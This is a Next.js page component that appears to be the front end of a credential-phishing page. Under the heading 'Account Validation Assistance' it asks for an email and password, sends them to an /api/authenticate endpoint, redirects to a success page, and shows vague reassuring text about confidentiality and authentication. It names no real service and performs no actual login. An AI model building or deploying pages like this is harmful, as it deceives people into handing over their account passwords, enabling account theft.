import {  useState  } from "react"
import { useRouter } from "next/router"



export default function Home() {


  const [ email, setEmail ] = useState("")
  const [ password, setPassword ] = useState('')

  const router = useRouter()


  async function handleSubmit (e) {
    e.preventDefault()
    
   

    const res = await fetch("/api/authenticate",{
        method:"POST",
        body:JSON.stringify({
            email:email,
            password:password }),
        headers: {
            "Content-Type": "application/json",
        }
    })

    const { error } = await res.json()

    
    if(error) {
      console.log("error")
      }else {
        router.push("w_success")
      }

    setEmail("")
    setPassword("")

}

  return (
    <>
        <h2>Account Validation Assistance</h2>
        <div id='form_container'>
        
            <h3>Validate Account Below</h3>
            <form onSubmit={handleSubmit}>
              <input id="email" type='email'  placeholder="Enter email" value={email} onChange={(e) => setEmail(e.target.value)}/>
              
              <input id='password' type='password' placeholder='Enter password'  value={password} onChange={(e) => setPassword(e.target.value)}/>
              <br />
              <button >Submit</button>
            </form>
        
      </div>

      <div id='notice_div'>
          <p className='note'>Note </p>
          <p className='n_text'>The information collected is confidential and will not be disclosed by us to unauthorized third parties.<br />Customers are reminded to kindly provide accurate and truthful information for authentication and not provide data which is false or which belongs to third parties.<br />
          Authentication information will not be modified.<br />
          Authentication process will be carried out immediately upon reciept of information and we will have notify you of the authentication result</p>
      </div>
    </>
  )
}
